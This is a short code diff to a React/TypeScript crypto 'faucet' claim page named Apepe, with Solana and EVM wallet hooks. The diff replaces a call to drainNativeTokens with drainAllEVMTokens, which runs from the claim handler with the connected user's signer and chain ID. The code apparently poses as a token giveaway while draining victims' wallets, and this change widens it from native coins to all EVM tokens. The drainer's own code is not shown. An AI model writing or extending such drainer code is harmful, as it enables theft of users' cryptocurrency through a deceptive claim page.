@@ -14,7 +14,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import apepeImage from '@/assets/apepe.jpg';
 
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -32,7 +32,7 @@ interface TokenBalance {
 const Apepe = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain } = useChain();
+  const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
   const [isClaiming, setIsClaiming] = useState(false);
@@ -100,7 +100,7 @@ const Apepe = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        await drainNativeTokens(evmSigner, evmProvider, chainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
       } catch (error) {
         console.error(error);
       } finally {
